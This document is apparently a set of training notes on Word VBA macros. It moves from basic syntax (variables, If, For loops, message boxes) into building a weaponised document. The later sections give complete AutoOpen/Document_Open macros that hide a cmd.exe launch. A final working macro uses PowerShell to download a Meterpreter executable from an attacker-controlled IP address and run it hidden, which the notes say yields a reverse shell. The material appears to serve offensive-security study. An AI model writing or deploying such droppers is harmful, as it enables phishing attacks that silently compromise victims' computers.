<img width="1189" height="194" alt="image" src="https://github.com/user-attachments/assets/452dd7db-f606-45d8-a5f9-554588611c39" />

choose same doc
<img width="451" height="366" alt="image" src="https://github.com/user-attachments/assets/5592eeeb-31da-42df-818e-28d90aba5453" />

enter macro's name and Create
<img width="1003" height="583" alt="image" src="https://github.com/user-attachments/assets/d4c6c61f-eb4a-4aec-8162-6db367b3dde5" />

Variables before use, the name of the variable and its datatype.dtype
- Dim myString As String
- Dim myLong As Long
- Dim myPointer As LongPtr

In the example below, we'll have our macro check the value of a variable and based on the result, display the appropriate built-in MsgBoxmsgbox function.
```
Sub MyMacro()

Dim myLong As Long

myLong = 1

If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub
```

To execute the macro we either click the "Run Macro" button or press %.

<img width="520" height="54" alt="image" src="https://github.com/user-attachments/assets/5557c13b-f7de-4ecd-a153-ab1689bd5695" />


This macro will display a "True" message box since the myLong variable is less than five.

Next, we'll explore the For loop, which increments a counter through the Next keyword. This is illustrated below in Listing 19.
```
Sub MyMacro()

For counter = 1 To 3
    MsgBox ("Alert")
Next counter

End Sub
```

or

<img width="1397" height="764" alt="image" src="https://github.com/user-attachments/assets/0a9b2bae-d46f-4041-aeb9-838e7467c614" />

and we got

<img width="1397" height="764" alt="image" src="https://github.com/user-attachments/assets/b704abd1-6626-470d-9898-6d0c5f47adab" />


Disabled macros notifications

<img width="1843" height="759" alt="image" src="https://github.com/user-attachments/assets/c02f62e7-5b01-4f6d-98cf-91edb6bca368" />

<img width="1843" height="759" alt="image" src="https://github.com/user-attachments/assets/ed050f3f-a98d-482a-9017-46fada3fc006" />


for Windows script host for a shell
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```


### Let PowerShell Help Us

PowerShell code to download Meterpreter executable
```
$url = "http://192.168.119.120/msfstaged.exe"
$out = "msfstaged.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)

```

Let's start writing our VBA code. 
```
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
Shell str, vbHide
```

Getting file path from ActiveDocument.Path
```
Dim exePath As String
exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
```

Complete VBA Macro
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
Let's review what we did. We built a Word document that pulls the Meterpreter executable from our web server when the document is opened (and macros are enabled). We added a small time delay to allow the file to completely download. We then executed the file hidden from the user. This results in a reverse Meterpreter shell.






















